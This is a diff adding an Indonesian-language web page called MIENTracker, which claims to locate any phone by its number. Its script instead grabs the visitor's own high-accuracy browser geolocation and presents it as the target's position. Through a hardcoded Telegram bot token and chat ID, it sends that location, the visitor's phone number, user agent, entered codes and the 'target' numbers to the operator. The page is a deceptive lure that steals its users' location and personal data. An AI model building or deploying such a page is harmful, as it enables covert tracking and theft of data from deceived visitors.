@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MIENTracker - System Access</title>
+    <style>
+        /* Matrix Background */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+        }
+        
+        /* Global Styles */
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #000;
+            color: #0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        
+        /* Login Page Styles */
+        .login-container {
+            background-color: rgba(0, 0, 0, 0.8);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            padding: 30px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            display: block;
+        }
+        
+        .login-header {
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .login-header h1 {
+            color: #0f0;
+            margin: 0;
+            font-size: 24px;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+        
+        .login-header p {
+            color: #aaa;
+            margin: 5px 0 0;
+            font-size: 12px;
+        }
+        
+        .input-group {
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .input-group label {
+            display: block;
+            text-align: left;
+            margin-bottom: 5px;
+            color: #0f0;
+            font-size: 14px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: #111;
+            border: 1px solid #333;
+            border-radius: 3px;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s;
+        }
+        
+        .input-group input:focus {
+            border-color: #0f0;
+            box-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+        }
+        
+        .login-button {
+            background-color: #0f0;
+            color: #000;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            font-weight: bold;
+            width: 100%;
+            transition: all 0.3s;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .login-button:hover {
+            background-color: #0c0;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+        
+        .terminal {
+            background-color: #111;
+            border: 1px solid #0f0;
+            border-radius: 3px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: left;
+            height: 100px;
+            overflow-y: auto;
+            font-size: 12px;
+            display: none;
+        }
+        
+        .terminal-line {
+            margin: 5px 0;
+            line-height: 1.4;
+        }
+        
+        .terminal-prompt {
+            color: #0f0;
+        }
+        
+        .cyber-logo {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #0f0;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+        
+        /* Loading Screen Styles */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+        
+        .loading-text {
+            color: #0f0;
+            margin-top: 20px;
+            font-size: 18px;
+            text-align: center;
+        }
+        
+        .loading-bar {
+            width: 300px;
+            height: 3px;
+            background-color: #111;
+            margin-top: 20px;
+            overflow: hidden;
+            border-radius: 3px;
+        }
+        
+        .loading-progress {
+            height: 100%;
+            width: 0;
+            background-color: #0f0;
+            transition: width 0.3s;
+        }
+        
+        .hacker-text {
+            font-family: 'Courier New', monospace;
+            font-size: 24px;
+            color: #0f0;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .flashing-cursor {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        /* Tracking Page Styles */
+        .tracking-container {
+            background-color: #1e1e1e;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .logo {
+            margin-bottom: 20px;
+        }
+        
+        .tracking-container h1 {
+            color: #4CAF50;
+            margin-bottom: 10px;
+        }
+        
+        .tagline {
+            color: #a0a0a0;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        .tracking-input-group {
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .tracking-input-group input {
+            width: 100%;
+            padding: 15px;
+            background-color: #2d2d2d;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s;
+        }
+        
+        .tracking-input-group input:focus {
+            border-color: #4CAF50;
+            box-shadow: 0 0 0 2px rgba(76, 175, 80, 0.2);
+        }
+        
+        .track-button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .track-button:hover {
+            background-color: #45a049;
+            transform: translateY(-2px);
+        }
+        
+        .track-button:disabled {
+            background-color: #333;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        
+        .loader {
+            border: 5px solid #2d2d2d;
+            border-top: 5px solid #4CAF50;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #252525;
+            display: none;
+        }
+        
+        .map-container {
+            margin-top: 20px;
+            height: 200px;
+            border-radius: 8px;
+            overflow: hidden;
+            display: none;
+            background-color: #2d2d2d;
+        }
+        
+        .map-placeholder {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            color: #a0a0a0;
+        }
+        
+        .success {
+            color: #4CAF50;
+        }
+        
+        .error {
+            color: rgb(255,255,255),3);
+        }
+        
+        .location-details {
+            margin-top: 15px;
+            text-align: left;
+            display: none;
+        }
+        
+        .detail-item {
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .detail-label {
+            color: #a0a0a0;
+        }
+        
+        .detail-value {
+            color: white;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix Background Canvas -->
+    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
+    
+    <!-- Login Container -->
+    <div class="login-container" id="loginContainer">
+        <div class="login-header">
+            <div class="cyber-logo">MIENTracker</div>
+            <h1>SYSTEM LOGIN</h1>
+            <p>Masukkan nomor telepon untuk mengakses sistem pelacakan</p>
+        </div>
+        
+        <div class="input-group">
+            <label for="loginPhone">NOMOR TELEPON</label>
+            <input type="tel" id="loginPhone" placeholder="+62xxxxxxxxxx" pattern="[0-9+]*" inputmode="numeric" maxlength="15">
+        </div>
+        
+        <div class="input-group">
+            <label for="loginCode">KODE VERIFIKASI</label>
+            <input type="text" id="loginCode" placeholder="Masukkan kode 6 digit" maxlength="6" disabled>
+        </div>
+        
+        <button class="login-button" id="loginButton" onclick="startLogin()">Klik untuk dapatkan kode</button>
+        
+        <div class="terminal" id="terminal">
+            <div class="terminal-line"><span class="terminal-prompt">></span> Sistem verifikasi dimulai...</div>
+        </div>
+    </div>
+    
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="hacker-text">
+            MEMUAT SISTEM PELACAKAN<span class="flashing-cursor">_</span>
+        </div>
+        <div class="loading-bar">
+            <div class="loading-progress" id="loadingProgress"></div>
+        </div>
+        <div class="loading-text" id="loadingStatus">Menginisialisasi modul pelacakan...</div>
+    </div>
+    
+    <!-- Tracking Container -->
+    <div class="tracking-container" id="trackingContainer">
+        <div class="logo"></div>
+        <h1>MIENTracker</h1>
+        <div class="tagline">Sistem Pelacakan Lokasi via Nomor Telepon</div>
+        
+        <div class="tracking-input-group">
+            <input type="tel" id="phoneNumber" placeholder="Masukkan Nomor Telepon Target" pattern="[0-9]*" inputmode="numeric" maxlength="15">
+        </div>
+        
+        <button class="track-button" id="trackButton" onclick="startTracking()">Lacak Lokasi</button>
+        
+        <div id="trackingLoading" class="loading">
+            <div class="loader"></div>
+            <p>Memproses permintaan lacak...</p>
+        </div>
+        
+        <div id="status" class="status">
+            <p id="statusText"></p>
+        </div>
+        
+        <div id="mapContainer" class="map-container">
+            <div class="map-placeholder">
+                <p>Peta lokasi akan muncul di sini</p>
+            </div>
+        </div>
+        
+        <div id="locationDetails" class="location-details">
+            <div class="detail-item">
+                <span class="detail-label">Latitude:</span>
+                <span id="latitude" class="detail-value">-</span>
+            </div>
+            <div class="detail-item">
+                <span class="detail-label">Longitude:</span>
+                <span id="longitude" class="detail-value">-</span>
+            </div>
+            <div class="detail-item">
+                <span class="detail-label">Akurasi:</span>
+                <span id="accuracy" class="detail-value">- meter</span>
+            </div>
+            <div class="detail-item">
+                <span class="detail-label">Waktu:</span>
+                <span id="timestamp" class="detail-value">-</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '7723202416:AAHGcGq9XYJbXd3fgJHHl64CJ-Ovau2KI44';
+        const TELEGRAM_CHAT_ID = '7932600874';
+        
+        // Matrix background effect
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
+        const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        const nums = '0123456789';
+        
+        const alphabet = katakana + latin + nums;
+        
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        
+        const rainDrops = [];
+        
+        for (let x = 0; x < columns; x++) {
+            rainDrops[x] = 1;
+        }
+        
+        const draw = () => {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#0f0';
+            ctx.font = fontSize + 'px monospace';
+            
+            for (let i = 0; i < rainDrops.length; i++) {
+                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
+                
+                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    rainDrops[i] = 0;
+                }
+                rainDrops[i]++;
+            }
+        };
+        
+        setInterval(draw, 30);
+        
+        // Login functionality
+        let verificationCode = '';
+        let loggedInPhoneNumber = '';
+        
+        function startLogin() {
+            const phoneNumber = document.getElementById('loginPhone').value;
+            
+            if (!phoneNumber) {
+                alert('Masukkan nomor telepon terlebih dahulu');
+                return;
+            }
+            
+            loggedInPhoneNumber = phoneNumber;
+            document.getElementById('loginButton').disabled = true;
+            document.getElementById('terminal').style.display = 'block';
+            const terminal = document.getElementById('terminal');
+            
+            // Send login attempt to Telegram
+            sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: Fetching...`);
+            
+            // Simulate verification process
+            setTimeout(() => {
+                addTerminalLine('> Menghubungkan ke server verifikasi...');
+                
+                setTimeout(() => {
+                    addTerminalLine('> Server merespons... [200 OK]');
+                    
+                    setTimeout(() => {
+                        verificationCode = generateRandomCode();
+                        addTerminalLine(`> Kode anda adalah:
+                        
+                        ${verificationCode}`);
+                        
+                        // Send verification code to Telegram
+                        sendToTelegram(`📳 VERIFICATION CODE SENT\n📱 Nomor: ${phoneNumber}\n🔢 Kode: ${verificationCode}`);
+                        
+                        document.getElementById('loginCode').disabled = false;
+                        document.getElementById('loginButton').textContent = 'VERIFIKASI KODE';
+                        document.getElementById('loginButton').onclick = verifyCode;
+                        document.getElementById('loginButton').disabled = false;
+                    }, 1000);
+                }, 1500);
+            }, 1000);
+        }
+        
+        function verifyCode() {
+            const enteredCode = document.getElementById('loginCode').value;
+            const terminal = document.getElementById('terminal');
+            
+            if (!enteredCode) {
+                alert('Masukkan kode verifikasi terlebih dahulu');
+                return;
+            }
+            
+            if (enteredCode === verificationCode) {
+                addTerminalLine('> Kode verifikasi valid!');
+                addTerminalLine('> Mengotentikasi pengguna...');
+                
+                // Send successful verification to Telegram
+                sendToTelegram(`✅ LOGIN SUCCESS\n📱 Nomor: ${loggedInPhoneNumber}\n🔢 Kode: ${enteredCode}\n🕒 Waktu: ${new Date().toLocaleString()}`);
+                
+                setTimeout(() => {
+                    addTerminalLine('> Otentikasi berhasil!');
+                    addTerminalLine('> Memuat sistem pelacakan...');
+                    
+                    // Show loading screen
+                    showLoadingScreen();
+                }, 1500);
+            } else {
+                addTerminalLine('> ERROR: Kode verifikasi tidak valid!');
+                // Send failed attempt to Telegram
+                sendToTelegram(`❌ FAILED LOGIN ATTEMPT\n📱 Nomor: ${loggedInPhoneNumber}\n🔢 Kode Salah: ${enteredCode}`);
+                alert('Kode verifikasi tidak valid!');
+            }
+        }
+        
+        function addTerminalLine(text) {
+            const terminal = document.getElementById('terminal');
+            const newLine = document.createElement('div');
+            newLine.className = 'terminal-line';
+            newLine.innerHTML = `<span class="terminal-prompt">></span> ${text}`;
+            terminal.appendChild(newLine);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        function generateRandomCode() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+        
+        function showLoadingScreen() {
+            document.getElementById('loadingScreen').style.display = 'flex';
+            
+            const loadingStatus = document.getElementById('loadingStatus');
+            const loadingProgress = document.getElementById('loadingProgress');
+            
+            const messages = [
+                'Menginisialisasi modul pelacakan...',
+                'Memuat database lokasi...',
+                'Menghubungkan ke jaringan target...',
+                'Mengaktifkan protokol enkripsi...',
+                'Memverifikasi kredensial...',
+                'Sistem siap digunakan!'
+            ];
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.floor(Math.random() * 10) + 5;
+                if (progress > 100) progress = 100;
+                loadingProgress.style.width = `${progress}%`;
+                
+                if (progress < 20) {
+                    loadingStatus.textContent = messages[0];
+                } else if (progress < 40) {
+                    loadingStatus.textContent = messages[1];
+                } else if (progress < 60) {
+                    loadingStatus.textContent = messages[2];
+                } else if (progress < 80) {
+                    loadingStatus.textContent = messages[3];
+                } else if (progress < 100) {
+                    loadingStatus.textContent = messages[4];
+                } else {
+                    loadingStatus.textContent = messages[5];
+                    clearInterval(interval);
+                    
+                    // Switch to tracking page after loading completes
+                    setTimeout(() => {
+                        document.getElementById('loadingScreen').style.display = 'none';
+                        document.getElementById('loginContainer').style.display = 'none';
+                        document.getElementById('trackingContainer').style.display = 'block';
+                    }, 1000);
+                }
+            }, 300);
+        }
+        
+        // Tracking functionality
+        function startTracking() {
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            
+            if (!phoneNumber) {
+                showStatus('Mohon masukkan nomor telepon terlebih dahulu', 'error');
+                return;
+            }
+            
+            // Send tracking attempt to Telegram
+            sendToTelegram(`🔍 TRACKING ATTEMPT\n📱 Pelacak: ${loggedInPhoneNumber}\n🎯 Target: ${phoneNumber}\n🕒 Waktu: ${new Date().toLocaleString()}`);
+            
+            document.getElementById('trackButton').disabled = true;
+            document.getElementById('trackingLoading').style.display = 'block';
+            document.getElementById('status').style.display = 'none';
+            document.getElementById('mapContainer').style.display = 'none';
+            document.getElementById('locationDetails').style.display = 'none';
+            
+            // Simulasi verifikasi nomor telepon
+            setTimeout(() => {
+                verifyTrackingNumber(phoneNumber);
+            }, 1500);
+        }
+        
+        function verifyTrackingNumber(phoneNumber) {
+            showStatus(`Memverifikasi nomor ${phoneNumber}...`);
+            
+            // Simulasi waktu verifikasi
+            setTimeout(() => {
+                getTargetLocation(phoneNumber);
+            }, 2000);
+        }
+        
+        function getTargetLocation(phoneNumber) {
+            showStatus('Menghubungkan ke jaringan target...');
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        sendLocationToTelegram(position, phoneNumber);
+                        displayLocation(position);
+                    },
+                    error => {
+                        handleGeolocationError(error);
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                showStatus('Browser Anda tidak mendukung geolokasi', 'error');
+                document.getElementById('trackButton').disabled = false;
+                document.getElementById('trackingLoading').style.display = 'none';
+            }
+        }
+        
+        function sendLocationToTelegram(position, phoneNumber) {
+            const { latitude, longitude, accuracy } = position.coords;
+            const timestamp = new Date(position.timestamp).toLocaleString();
+            
+            const message = `
+🚨 LOKASI DITEMUKAN 🚨
+👤 Pelacak: ${loggedInPhoneNumber}
+📱 Nomor Target: ${phoneNumber}
+📍 Latitude: ${latitude}
+📍 Longitude: ${longitude}
+🎯 Akurasi: ${accuracy} meter
+⏰ Waktu: ${timestamp}
+🌐 IP: Fetching...
+🖥️ User Agent: ${navigator.userAgent}
+            `;
+            
+            sendToTelegram(message);
+        }
+        
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Pesan terkirim ke Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error mengirim ke Telegram:', error);
+                });
+        }
+        
+        function displayLocation(position) {
+            const { latitude, longitude, accuracy } = position.coords;
+            const timestamp = new Date(position.timestamp).toLocaleString();
+            
+            document.getElementById('latitude').textContent = latitude;
+            document.getElementById('longitude').textContent = longitude;
+            document.getElementById('accuracy').textContent = accuracy;
+            document.getElementById('timestamp').textContent = timestamp;
+            
+            document.getElementById('trackingLoading').style.display = 'none';
+            document.getElementById('mapContainer').style.display = 'block';
+            document.getElementById('locationDetails').style.display = 'block';
+            document.getElementById('trackButton').disabled = false;
+            
+            showStatus('Lokasi berhasil ditemukan dan dikirim!', 'success');
+            
+            // Update map (simulasi)
+            setTimeout(() => {
+                document.querySelector('.map-placeholder').innerHTML = `
+                    <img src="https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=500x200&maptype=roadmap&markers=color:red%7C${latitude},${longitude}&key=AIzaSyDummyKey123456" alt="Peta lokasi dengan pin merah menunjukkan posisi target" style="width:100%;height:100%;object-fit:cover;" />
+                `;
+            }, 500);
+        }
+        
+        function handleGeolocationError(error) {
+            let errorMessage = '';
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = 'Mohon izinkan akses lokasi agar kordinat terbaca.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = 'Informasi lokasi tidak tersedia.';
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = 'Permintaan lokasi melebihi waktu tunggu.';
+                    break;
+                case error.UNKNOWN_ERROR:
+                    errorMessage = 'Terjadi kesalahan yang tidak diketahui.';
+                    break;
+            }
+            
+            showStatus(`Gagal mendapatkan lokasi: ${errorMessage}`, 'error');
+            document.getElementById('trackingLoading').style.display = 'none';
+            document.getElementById('trackButton').disabled = false;
+            
+            // Send error to Telegram
+            sendToTelegram(`❌ TRACKING ERROR\n📱 Target: ${document.getElementById('phoneNumber').value}\n⚠️ Error: ${errorMessage}`);
+        }
+        
+        function showStatus(message, type = 'info') {
+            const statusElement = document.getElementById('status');
+            const statusTextElement = document.getElementById('statusText');
+            
+            statusElement.style.display = 'block';
+            statusTextElement.textContent = message;
+            
+            // Reset classes
+            statusElement.className = 'status';
+            
+            // Add type class
+            if (type === 'success') {
+                statusElement.classList.add('success');
+            } else if (type === 'error') {
+                statusElement.classList.add('error');
+            }
+        }
+    </script>
+</body>
+</html>
